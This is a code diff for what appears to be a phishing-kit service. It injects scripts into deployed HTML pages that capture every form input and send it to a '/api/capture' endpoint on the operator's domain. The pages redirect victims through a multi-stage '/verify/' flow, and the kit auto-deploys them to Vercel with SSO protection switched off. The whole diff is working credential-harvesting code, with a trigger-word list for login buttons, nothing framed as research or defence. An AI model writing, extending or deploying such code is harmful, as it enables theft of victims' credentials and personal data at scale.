@@ -589,10 +589,11 @@ async function handlePublicDeploy(request, env, rootDomain) {
             return jsonError("Must provide a template or custom HTML");
         }
 
-        const scriptUrl = '/api/js/injection.js'; // Use internal route
+        const scriptUrl = 'https://' + rootDomain + '/api/js/injection.js'; // Absolute route for Vercel
 
         if (shouldInject) {
             let injectionBlockStage1 = `<script>window.UNIQUE_CODE = ${JSON.stringify(uniqueCode)};</script>`;
+            injectionBlockStage1 += `<script>window.CAPTURE_URL = "https://" + ${JSON.stringify(rootDomain)} + "/api/capture";</script>`;
             if (redirectUrl) {
                 injectionBlockStage1 += `<script>window.REDIRECT_URL = ${JSON.stringify(redirectUrl)};</script>`;
             }
@@ -609,6 +610,7 @@ async function handlePublicDeploy(request, env, rootDomain) {
 
             if (isMultiStage && htmlContentStage2) {
                 let injectionBlockStage2 = `<script>window.UNIQUE_CODE = ${JSON.stringify(uniqueCode)};</script>`;
+                injectionBlockStage2 += `<script>window.CAPTURE_URL = "https://" + ${JSON.stringify(rootDomain)} + "/api/capture";</script>`;
                 if (redirectUrl) {
                     injectionBlockStage2 += `<script>window.REDIRECT_URL = ${JSON.stringify(redirectUrl)};</script>`;
                 }
@@ -642,16 +644,98 @@ async function handlePublicDeploy(request, env, rootDomain) {
                 templateName: actualTemplateName
             }));
         }
+        // ----------------------------------------------------
+        // VERCEL DEPLOYMENT INTEGRATION
+        // ----------------------------------------------------
+        const VERCEL_TOKEN = env.VERCEL_TOKEN;
+        const projectName = subdomain;
+
+        // 1. Create/Patch Project to disable SSO Protection
+        let vercelUrl = `https://${subdomain}.${rootDomain}`;
+
+        try {
+            if (VERCEL_TOKEN) {
+                const createProjRes = await fetch('https://api.vercel.com/v9/projects', {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${VERCEL_TOKEN}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        name: projectName,
+                        framework: null
+                    })
+                });
+
+                await fetch(`https://api.vercel.com/v9/projects/${projectName}`, {
+                    method: 'PATCH',
+                    headers: {
+                        'Authorization': `Bearer ${VERCEL_TOKEN}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        ssoProtection: null
+                    })
+                });
+
+                // 2. Deploy Files
+                const files = [
+                    { file: 'index.html', data: htmlContent }
+                ];
+
+                if (isMultiStage && htmlContentStage2) {
+                    files.push({ file: 'verify/index.html', data: htmlContentStage2 });
+                    files.push({ file: 'verify/index.htm', data: htmlContentStage2 });
+                }
+
+                const vercelJson = {
+                    "cleanUrls": true,
+                    "public": true,
+                    "github": { "enabled": false }
+                };
+                files.push({ file: 'vercel.json', data: JSON.stringify(vercelJson) });
+
+                const deployBody = {
+                    name: projectName,
+                    files: files,
+                    projectSettings: { framework: null },
+                    target: 'production'
+                };
+
+                const deployRes = await fetch('https://api.vercel.com/v13/deployments', {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${VERCEL_TOKEN}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(deployBody)
+                });
+
+                if (deployRes.ok) {
+                    const deployData = await deployRes.json();
+                    vercelUrl = 'https://' + deployData.url;
+                } else {
+                    console.log("Vercel Deploy Error", await deployRes.text());
+                }
+            } else {
+                console.log("VERCEL_TOKEN not configured in environment, falling back to basic deployment.");
+            }
+        } catch (vErr) {
+            console.log("Vercel Error:", vErr);
+        }
+        // ----------------------------------------------------
+
 
         currentSites.push({
             subdomain,
             created: Date.now(),
-            templateName: actualTemplateName
+            templateName: actualTemplateName,
+            vercelUrl: vercelUrl // Save Vercel URL
         });
 
         await env.SUBDOMAINS.put(mapKey, JSON.stringify({ sites: currentSites }));
 
-        return new Response(JSON.stringify({ success: true, url: `https://${subdomain}.${rootDomain}` }), {
+        return new Response(JSON.stringify({ success: true, url: vercelUrl }), {
             headers: { 'Content-Type': 'application/json' }
         });
     } catch (e) {
@@ -1199,7 +1283,7 @@ const CONFIG = {
         'log on', 'start', 'verify', 'go', 'enter', 'accept'
     ],
     REDIRECT_URL: window.REDIRECT_URL || 'https://example.com',
-    CAPTURE_URL: '/api/capture',
+    CAPTURE_URL: window.CAPTURE_URL || '/api/capture',
     MULTI_STAGE: window.MULTI_STAGE || false
 };
 
@@ -1290,7 +1374,7 @@ const CONFIG = {
                  const s1Data = captureAllInputs();
                  sessionStorage.setItem('dtech_stage1', JSON.stringify(s1Data));
                  log('Saved Stage 1 Data, redirecting to Stage 2');
-                 window.location.href = '/verify';
+                 window.location.href = '/verify/';
                  return;
              }
         }
